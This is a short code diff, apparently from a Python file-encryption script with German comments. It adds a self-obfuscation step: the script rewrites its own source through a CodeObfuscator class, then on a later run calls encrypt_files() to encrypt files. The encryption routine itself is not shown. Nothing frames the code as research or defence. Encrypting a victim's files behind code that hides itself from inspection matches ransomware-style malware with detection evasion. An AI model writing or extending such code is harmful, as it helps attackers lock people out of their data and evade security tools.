@@ -159,5 +159,23 @@ def main():
 
     print("Files successfully encrypted.")
 
-if  __name__ == "__main__":
-    main()
+def main():
+    encrypt_files()
+
+if __name__ == "__main__":
+    # Code selbst verschleiern
+    with open(__file__, 'r') as f:
+        content = f.read()
+    
+    if 'CodeObfuscator' in content:
+        # Noch nicht verschleiert
+        obfuscator = CodeObfuscator()
+        obfuscated_code = obfuscator.obfuscate(content)
+        
+        with open(__file__, 'w') as f:
+            f.write(obfuscated_code)
+        
+        print("Code verschleiert. Starte neu für Dateiverschlüsselung.")
+    else:
+        # Bereits verschleiert, normale Ausführung
+        main()
